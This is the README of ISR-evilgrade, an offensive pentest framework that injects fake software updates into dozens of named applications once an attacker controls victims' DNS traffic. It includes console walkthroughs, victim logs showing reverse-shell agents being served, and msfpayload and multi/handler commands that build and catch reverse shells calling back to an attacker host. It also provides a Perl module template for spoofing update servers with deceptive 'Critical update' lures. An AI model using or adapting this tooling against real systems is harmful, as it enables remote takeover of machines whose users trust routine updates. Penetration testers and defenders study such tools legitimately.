<p align="center" >
  <a href="https://www.faradaysec.com" target="_blank"><img src="https://1.bp.blogspot.com/-DHDtcxnAujs/Xp5TEcdoeeI/AAAAAAAASZQ/fbSKCoPnFjUwhbPN0bUQyIpSWnPKRMhZACNcBGAsYHQ/s1600/ad_kitploitadv6.png"></a>
</p>
<p align="center" >
 Faraday Security Research
-- | ISR-evilgrade | www.faradaysec.com | --
</p>

## .:: [BRIEF OVERVIEW] ::.

Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates.
It comes with pre-made binaries (agents), a working default configuration for fast pentests, and has it's own WebServer and DNSServer modules.
Easy to set up new settings, and has an autoconfiguration when new binary agents are set.

##### * When should I use evilgrade?

This framework comes into play when the attacker is able to make hostname redirections (manipulation of victim's dns traffic), and such thing can be done on 2 scenarios:

##### Internal scenery:
- Internal DNS access
- ARP spoofing
- DNS Cache Poisoning
- DHCP spoofing
- TCP hijacking
- Wi-Fi Access Point impersonation

##### External scenery:
- Internal DNS access
- DNS Cache Poisoning

##### * How does it work?

Evilgrade works with modules, in each module there's an implemented structure which is needed to emulate a fake update for an specific application/system.

##### * What OS are supported?

ISR-Evilgrade is crossplatform, it only depends of having an appropriate payload for the right target platform to be exploited.

#### Implemented modules:
-------------------
- Freerip 3.30
- Jet photo 4.7.2
- Teamviewer 5.1.9385
- ISOpen 4.5.0
- Istat.
- Gom 2.1.25.5015
- Atube catcher 1.0.300
- Vidbox 7.5
- Ccleaner 2.30.1130
- Fcleaner 1.2.9.409
- Allmynotes 1.26
- Notepad++ 5.8.2
- Java 1.6.0_22  winxp/win7
- aMSN 0.98.3
- Appleupdate <= 2.1.1.116 ( Safari 5.0.2 7533.18.5, <= Itunes 10.0.1.22, <= Quicktime 7.6.8 1675)
- Mirc 7.14
- Windows update (ie6 lastversion, ie7 7.0.5730.13, ie8 8.0.60001.18702, Microsoft works)
- Dap 9.5.0.3
- Winscp 4.2.9
- AutoIt Script 3.3.6.1
- Clamwin 0.96.0.1
- AppTapp Installer 3.11 (Iphone/Itunes)
- getjar (facebook.com)
- Google Analytics Javascript injection
- Speedbit Optimizer 3.0 / Video Acceleration 2.2.1.8
- Winamp 5.581
- TechTracker (cnet) 1.3.1 (Build 55)
- Nokiasoftware firmware update 2.4.8es - (Windows software)
- Nokia firmware v20.2.011
- BSplayer 2.53.1034
- Apt ( < Ubuntu 10.04 LTS)
- Ubertwitter 4.6 (0.971)
- Blackberry Facebook 1.7.0.22 | Twitter 1.0.0.45
- Cpan 1.9402
- VirtualBox (3.2.8 )
- Express talk
- Filezilla
- Flashget
- Miranda
- Orbit
- Photoscape.
- Panda Antirootkit
- Skype
- Sunbelt
- Superantispyware
- Trillian <= 5.0.0.26
- Adium 1.3.10 (Sparkle Framework)
- VMware
- more...


* /docs/CHANGES

## .:: [MAIN USAGE] ::.

It works similar to an IOS console
```
evilgrade>help
Type 'help command' for more detailed help on a command.
  Commands:
    configure - Configure <module-name> - no help available
    exit      - exits the program
    help      - prints this screen, or help on 'command'
    reload    - Reload to update all the modules - no help available
    restart   - Restart webserver - no help available
    set       - Configure variables - no help available
    show      - Display information of <object>.
    start     - Start webserver - no help available
    status    - Get webserver status - no help available
    stop      - Stop webserver - no help available
    version   - Display framework version. - no help available

  Object:
     options  - Show options of current module.
     vhosts   - Show VirtualHosts of current module.
     modules  - List all modules available for use.
     active   - Show active modules.
```

## List implemented modules
``` console
evilgrade>show modules

List of modules:
===============

...
...
...

- 63 modules available.
```
#### Configure a specified module
``` console
evilgrade>conf sunjava
evilgrade(sunjava)>

```

#### Show all VirtualHosts.
#### VirtualHost field contains the domains that our webserver is going to emulate for us.
``` console
evilgrade>show vhosts

Virtual hosts:
=============

[
  "java.sun.com",
  "javadl-esd.sun.com",
  ...
  ...
  ...
]
```

#### Show options of current module.
#### agent: This is our fake update binary, we have to set the path to where it's located or implement a dynamic fake update binary generation (see ADVANCED).
``` console
evilgrade(sunjava)>show options

Display options:
===============

Name = Sun Microsystems Java
Version = 2.0
Author = ["Francisco Amato < famato +[AT]+ faradaysec.com>"]
Description = ""
VirtualHost = "java.sun.com|javadl-esd.sun.com"

.-------------------------------------------------------------------------------------------------------------------------.
| Name         | Default                                         | Description                                            |
+--------------+-------------------------------------------------+--------------------------------------------------------+
| website      | http://java.com/moreinfolink                    | Website displayed in the update                        |
| enable       |                                               1 | Status                                                 |
| atitle       | Critical vulnerability                          | Title name to be displayed in the systray item popup   |
| arg          |                                                 | Arg passed to Agent                                    |
| adescription | This critical update fix internal vulnerability | Description  to be displayed in the systray item popup |
| description  | This critical update fix internal vulnerability | Description to be displayed during the update          |
| agent        | ./agent/reverseshellsign.exe                    | Agent to inject                                        |
| title        | Critical update                                 | Title name displayed in the update                     |
'--------------+-------------------------------------------------+--------------------------------------------------------'
```
#### Start services (DNS Server and WebServer)
``` console
evilgrade>start
evilgrade>
[28/10/2010:21:35:55] - [WEBSERVER] - Webserver ready. Waiting for connections ...
evilgrade>
[28/10/2010:21:35:55] - [DNSSERVER] - DNS Server Ready. Waiting for Connections ...

#### Waiting for victims

evilgrade>
[25/7/2008:4:58:25] - [WEBSERVER] - [modules::sunjava] - [192.168.233.10] - Request: "^/update/[.\\d]+/map\\-[.\\d]+.xml"
evilgrade>
[25/7/2008:4:58:26] - [WEBSERVER] - [modules::sunjava] - [192.168.233.10] - Request: "^/java_update.xml\$"
evilgrade>
[25/7/2008:4:58:39] - [WEBSERVER] - [modules::sunjava] - [192.168.233.10] - Request: ".exe"
evilgrade>
[25/7/2008:4:58:40] - [WEBSERVER] - [modules::sunjava] - [192.168.233.10] - Agent sent: "./agent/reverseshell.exe"
```
#### Show status and victims logs
``` console
evilgrade>show status
Webserver (pid 4134) already running

Users status:
============

.---------------------------------------------------------------------------------------------------------------.
| Client         | Module           | Status | Md5,Cmd,File                                                     |
+----------------+------------------+--------+------------------------------------------------------------------+
| 192.168.233.10 | modules::sunjava | send   | d9a28baa883ecf51e41fc626e1d4eed5,'',"./agent/reverseshell.exe"   |
'----------------+------------------+--------+------------------------------------------------------------------'
```

## .:: [DEEP USAGE] ::.

### Commands
#### configure / conf - Configure <module-name>

Example:
-------
``` console
evilgrade>configure sunjava
evilgrade(sunjava)>

evilgrade>conf sunjava
evilgrade(sunjava)>

## 'conf' takes us back to the global configuration
evilgrade(sunjava)>conf
evilgrade>


##
reload    - Reload to get all modules update (to refresh loaded modules, useful on development)
start     - Start webserver
stop      - Stop webserver (fake update server)
```


Example:
-------
``` console
evilgrade>start
evilgrade>
[28/10/2010:21:35:55] - [WEBSERVER] - Webserver ready. Waiting for connections ...
evilgrade>
[28/10/2010:21:35:55] - [DNSSERVER] - DNS Server Ready. Waiting for Connections ...


#######################################



Example:
-------
evilgrade>stop
Stopping WEBSERVER  [OK]
Stopping DNSSERVER  [OK]

#######################################

restart   - Restart services (WebServer and DNS Server)
stops and starts again

#######################################

status    - Get webserver and victims status

Example:
-------
evilgrade>show status
Webserver (pid 4134) already running

Users status:
============

.---------------------------------------------------------------------------------------------------------------.
| Client         | Module           | Status | Md5,Cmd,File                                                     |
+----------------+------------------+--------+------------------------------------------------------------------+
| 192.168.233.10 | modules::sunjava | send   | d9a28baa883ecf51e41fc626e1d4eed5,'',"./agent/reverseshell.exe"   |
'----------------+------------------+--------+------------------------------------------------------------------'

#######################################

show      - Display information of <object>.

#######################################

show active    - Display active modules in the webserver

#######################################

show modules    - Display implemented modules

#########################################

show options    - Display modules/global options

Example:
-------

evilgrade>show options

Display options:
===============

.-----------------------------------------------------------------------------------.
| Name        | Default   | Description                                             |
+-------------+-----------+---------------------------------------------------------+
| DNSEnable   |         1 | Enable DNS Server ( handle virtual request on modules ) |
| DNSAnswerIp | 127.0.0.1 | Resolve VHost to ip  )                                  |
| DNSPort     |        53 | Listen Name Server port                                 |
| debug       |         1 | Debug mode                                              |
| port        |        80 | Webserver listening port                                |
| sslport     |       443 | Webserver SSL listening port                            |
'-------------+-----------+---------------------------------------------------------'

evilgrade>
evilgrade(notepadplus)>conf vmware
evilgrade(vmware)>show options (without started services)

Display options:
===============

Name = VMware Server
Version = 1.0
Author = ["Francisco Amato < famato +[AT]+ faradaysec.com>"]
Description = ""
VirtualHost = "www.vmware.com"

.----------------------------------------------.
| Name   | Default           | Description     |
+--------+-------------------+-----------------+
| enable |                 1 | Status          |
| agent  | ./agent/agent.exe | Agent to inject |
'--------+-------------------+-----------------'

evilgrade(vmware)>show options (with started services after setting agent)

Display options:
===============

Name = VMware Server
Version = 1.0
Author = ["Francisco Amato < famato +[AT]+ faradaysec.com>"]
Description = ""
VirtualHost = "www.vmware.com"

.--------------------------------------------------------------------------------------------------.
| Name        | Default                                                          | Description     |
+-------------+------------------------------------------------------------------+-----------------+
| enable      |                                                                1 | Status          |
| agentmd5    | f80af637642170507bda998b6f2015fa                                 |                 |
| agentsize   |                                                            54576 |                 |
| agent       | ./agent/agent.exe                                                | Agent to inject |
| agentsha256 | 44f4e3f65f6ca375df4e0247fa0ee1efedbe2965a1c35e910d8d035ec61b76bd |                 |
'-------------+------------------------------------------------------------------+-----------------'


#########################################

set       - Configure variables global or modules

Example:
-------

evilgrade>show options


Display options:
===============

.-----------------------------------------------------------------------------------.
| Name        | Default   | Description                                             |
+-------------+-----------+---------------------------------------------------------+
| DNSEnable   |         1 | Enable DNS Server ( handle virtual request on modules ) |
| DNSAnswerIp | 127.0.0.1 | Resolve VHost to ip  )                                  |
| DNSPort     |        53 | Listen Name Server port                                 |
| debug       |         0 | Debug mode                                              |
| port        |        80 | Webserver listening port                                |
| sslport     |       443 | Webserver SSL listening port                            |
'-------------+-----------+---------------------------------------------------------'

###Let's enable DEBUG option and set as DNSAnswerIp our Inet address (192.168.1.4)

evilgrade>set debug 1 #Enable debug
set debug, 1

evilgrade>set DNSAnswerIp 192.168.1.4 #Ip where evilgrade's DNS Server is listening
set DNSAnswerIp, 192.168.1.4

evilgrade>show options

Display options:
===============

.-------------------------------------------------------------------------------------.
| Name        | Default     | Description                                             |
+-------------+-------------+---------------------------------------------------------+
| DNSEnable   |           1 | Enable DNS Server ( handle virtual request on modules ) |
| DNSAnswerIp | 192.168.1.4 | Resolve VHost to ip  )                                  |
| DNSPort     |          53 | Listen Name Server port                                 |
| debug       |           1 | Debug mode                                              |
| port        |          80 | Webserver listening port                                |
| sslport     |         443 | Webserver SSL listening port                            |
'-------------+-------------+---------------------------------------------------------'


###############################

exit      - exits the program

#######################################

help      - prints this screen, or help on 'command'

#######################################

```

## .:: [ADVANCED] ::.

- Modules Options:
Each module has special options, but the "agent" field is always present.
The agent is our fake update binary, we have to set the path to where it's located or implement a dynamic fake update binary generation.

[Dynamic fake update binary] allows the execution of an external command to generate our binary, for example using msfpayload of metasploit framework.
With this feature we can generate any payload of metasploit or use an external interface to create the binary.

# Example 1:
```
evilgrade(sunjava)>set agent '["/metasploit/msfpayload windows/shell_reverse_tcp LHOST=192.168.233.2 LPORT=4141 X > <%OUT%>/tmp/a.exe<%OUT%>"]'
```

In this case for every required update binary we generate a fake update binary with the payload "windows/shell_reverse_tcp"
using a reverse shell to connect at address 192.168.233.2 port 4141.
The label <%OUT%><%OUT> is a special tag to detect where the output binary is going to be generated.
Evilgrade detects the usage of "dynamic fake update binary feature" due to having a sentence between squared brackets '[]'
Inside that brackets we have a string that is also between brackets "" that is compiled using perl.

For example if we use:
```
evilgrade(sunjava)>set agent '["./generatebin -o <%OUT%>/tmp/update".int(rand(256)).".exe<%OUT%>"]'
```
then every time we get a binary request, evilgrade will compile the line and execute the final string "./generatebin -o /tmp/update(random).exe"
generating different agents.


An easy alternative, but not dynamically, could be to generate the payload directly from msfpayload on a terminal and assign it manually to the configuration of the module.

# Example 2:

(Outside evilgrade)
```
[team@infobyte]$ msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.100.2 LPORT=4444 X > /tmp/reverse-shell.exe
```

(Inside evilgrade)
```
evilgrade(sunjava)>set agent /tmp/reverse-shell.exe
```

After our payload was generated, we leave a multi handler listening on the previously assigned LHOST.

(Outside evilgrade)
```
[team@infobyte]$ msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.100.2 LPORT=4444 E
[*] Started reverse handler on 192.168.100.2:4444
[*] Starting the payload handler...
```

## .:: [MODULE DEVELOPMENT] ::.

Module development is very simple. Since evilgrade is based on modules, you just have to use a package .pm (perl module).
In this case we are going to describe the sunjava update module (comments with #):

``` perl
package modules::sunjava;

use strict;
use Data::Dump qw(dump);

my $base=
{
    'name' => 'Sun Microsystems Java', #name of the module to display in the framework
    'version' => '2.0', #internal module version
    'appver' => '<= 1.6.0_22', #last application version tested with this evilgrade module
    'author' => [ 'Francisco Amato < famato +[AT]+ faradaysec.com>' ], #author
    'description' => qq{}, #brief description
    'vh' => '(java.sun.com|javadl-esd.sun.com)', #VirtualHosts that the application uses to retrieve information about the update configuration files and update binaries.

    #Then we have the request object's collection
    'request' => [
    #Each object it's a possible HTTP request inside the virtualhost configured for the module (java.sun.com)
        {
        'req' => '(/update/[.\d]+/map\-[.\d]+.xml|/update/1.6.0/map\-m\-1.6.0.xml)', #The required URL, regex friendly
        'type' => 'file', #it's the response type (file|string|agent|install)
         #we can use:
                      #file: response with content file referenced in the "file" option below (./include/sunjava_map.xml)
                      #string: response with a string referenced in the "string" options below
                      #agent:  response with content file referenced in the "agent" options (options section)
                      #install: response with content file referenced in the "file" option below
                        #It's used to know if the fake update was executed
                        #In some update process we can specify a final page after update installed
                        #so we send to a controller page.
        'method' => '', #not implemented yet
        'bin'    => '', #set to 1 if we are going to send a binary file
        'string' => '', #if we have chosen the 'type' string then in this variable we set the response
        'parse' => '', #set to 1 if the file or string need be parsed with options
        'file' => './include/sunjava/sunjava_map.xml'
        },

        {
        'req' => '^/java_update.xml$', #regex friendly
        'type' => 'file', #file|string|agent|install
        'method' => '', #any
        'bin'    => '',
        'string' => '',
        'parse' => '1',
        'file' => './include/sunjava/sunjava_update.xml'
        },
        {
        'req' => '/x.jnlp', #regex friendly
        'type' => 'file', #file|string|agent|install
        'method' => '', #any
        'bin'    => '',
        'string' => '',
        #In this case we parse the file
                    'parse' => '1',
        #To parse the file we use special tags, like <%OPTIONAME%> inside the "file" or "string" field
              #This tags are replaced with the values of the options, for example
              #<%TITLE%> will be replaced by 'Critical update'
        'file' => './include/sunjava/x.jnlp'
        },
        {
        'req' => '.jar', #regex friendly
        'type' => 'file', #file|string|agent|install
        'method' => '', #any
        'bin'    => 1,
        'string' => '',
        'parse' => '',
        'file' => './include/sunjava/JavaPayload/FunnyClass2.jar'
        },

        {
        'req' => '.exe', #regex friendly
        'type' => 'agent', #Here we have an agent type with a binary response
        'bin'    => 1,
        'method' => '', #any
        'string' => '',
        'parse' => '',
        'file' => ''
        }
    ],

    #Options
    #Here we have the options that will be displayed with "show options" inside the current module.
    #This options are used to parse the string or a file using in the responses
    'options' => {  'agent'  => { 'val' => './agent/java/javaws.exe', #The default value
              'desc' => 'Agent to inject'}, #Brief description
        'arg'    => { 'val' => 'http://java.sun.com/x.jnlp"',
              'desc' => 'Arg passed to Agent'},
        'enable' => { 'val' => 1,
              'desc' => 'Status'},

    #The following is a dynamic hidden option,
    #In this case we use the tag <%NAME%> to parse the files and execute perl functions to get randoms values
    #You can use whatever you like in perl, if you're wishing to use more functions check "isrcore/utils.pm"
                    'name'  => { 'val' => "'javaupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))",
                                'hidden' => 1,
                          'dynamic' =>1,},

    #All the options depend on the update process. You have to research the possible variables and implement them on your module
    #These are the mostly common update messages, webpages, descriptions, popup messages, title, etc
        'title'  => { 'val' => 'Critical update',
              'desc' => 'Title name displayed in the update'},
        'description' => { 'val' => 'This critical update fix internal vulnerability',
          'desc' => 'Description to be displayed during the update'},
        'atitle'  => { 'val' => 'Critical vulnerability',
               'desc' => 'Title name to be displayed in the systray item popup'},
        'adescription' => { 'val' => 'This critical update fix internal vulnerability',
          'desc' => 'Description  to be displayed in the systray item popup'},
        'website' => { 'val' => 'http://java.com/moreinfolink',
               'desc' => 'Website displayed in the update'}
     }
};
```

## .:: [TIPS] ::.

1) Don't forget to run evilgrade with an user that has privileges to create listening sockets,
otherwise you won't be able to use evilgrade's Services.

2) Everytime you modify a module with evilgrade running don't forget to 'reload' them.

3) Set the binary 'agents' before starting services because there are some fields that evilgrade
will fill out for you (agentmd5, agentsha256, and agentsize) that can't be done with them already running.

4) If you're using a dynamic response with variables such as: <%AGENTSIZE%>, <%AGENTMD5%>, <%URL\_FILE%>, <%URL\_FILE\_EXT%>, or custom ones defined at the options section, don't forget to set *parse* on 1.

5) Same goes for injecting an agent, you must enable de *bin* flag on 1.

6) If you want to make plaintext responses using HTTP use the *cheader* flag. Example below:
```
        {   'req' => '/sitepath/download/file.zip'
            ,    #regex friendly
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '',
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://sitedomain.com/<%URL_FILE%>.exe \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },

7) To filter via User-Agent, use as an example the Sparkle2 module. In base add  'useragent' => 'true', and on a request use as you would use the 'req' field but for user agents in 'useragent'. Note that this field already stripped "User-Agent: ".
```

## .:: [REQUIREMENTS] ::.

### Perl Modules
```
    Data::Dump
    Digest::MD5
    Time::HiRes
    RPC::XML
```

## .:: [MORE INFORMATION] ::.

This framework was presented in the following security conferences:

```
· ekoparty 2007 [Buenos Aires, Argentina] [www.ekoparty.org]
· Troopers 2008 [Munich, Germany] [www.troopers08.org]
· Shakacon 2008 [Hawaii, USA] [www.shakacon.org]
· H2HC 2009 [Brazil] [www.h2hc.com.br]
· Blackhat Arsenal & Defcon 2010 [Las Vegas, USA] [www.blackhat.com www.defcon.org]
```


## .:: [AUTHOR] ::.

Francisco Amato
famato+at+faradaysec+dot+com
